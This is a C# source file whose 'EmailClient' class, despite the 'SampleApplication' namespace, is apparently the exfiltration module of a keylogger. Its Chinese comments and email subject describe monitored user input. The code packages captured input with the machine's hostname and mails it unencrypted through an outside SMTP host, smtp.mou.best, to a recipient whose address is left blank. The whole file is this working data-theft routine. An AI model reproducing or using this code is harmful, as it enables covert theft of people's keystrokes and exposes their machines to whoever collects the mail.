using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Net.Mail;
using System.Net;

namespace SampleApplication
{
    internal class EmailClient
    {
        public static bool SendEmail(string ready)
        {
            //明文准备的邮箱信息
            string sendEmail = null;//发件人邮箱账号
            string sendEmailPwd = null;//发件人邮箱密码
            string host = "smtp.mou.best";
            string toEmail = null;//收件人邮箱账号

            //标题
            StringBuilder cache = new StringBuilder();
            cache.Append(DateTime.Now.ToLocalTime().ToString());
            cache.Append("之前的监听用户输入数据");
            string title = cache.ToString();

            //内容
            StringBuilder content = new StringBuilder("计算机名称:",50);
            content.Append(System.Net.Dns.GetHostName());
            content.Append("\n");
            content.Append(ready);

            //smtp设置
            SmtpClient smtpClient = new SmtpClient(host);
            smtpClient.EnableSsl = false;
            smtpClient.UseDefaultCredentials = false;
            smtpClient.DeliveryMethod = SmtpDeliveryMethod.Network;

            //设置smtp发件人信息
            smtpClient.Credentials = new NetworkCredential(sendEmail, sendEmailPwd);

            //发信设定
            MailMessage sendMsg = new MailMessage();

            //最终敲定发信设置
            sendMsg.From = new MailAddress(sendEmail);
            sendMsg.To.Add(new MailAddress(toEmail));
            sendMsg.SubjectEncoding = Encoding.UTF8; 
            sendMsg.BodyEncoding = Encoding.UTF8;
            //标题与内容
            sendMsg.Subject = title;
            sendMsg.Body = content.ToString();
            sendMsg.IsBodyHtml = true;
            sendMsg.Priority = MailPriority.High;
            try
            {
               smtpClient.Send(sendMsg);
                return true;
            }
            catch(Exception ex)
            {
                Console.WriteLine(ex.ToString());
                return false;
            }
        }

    }
}
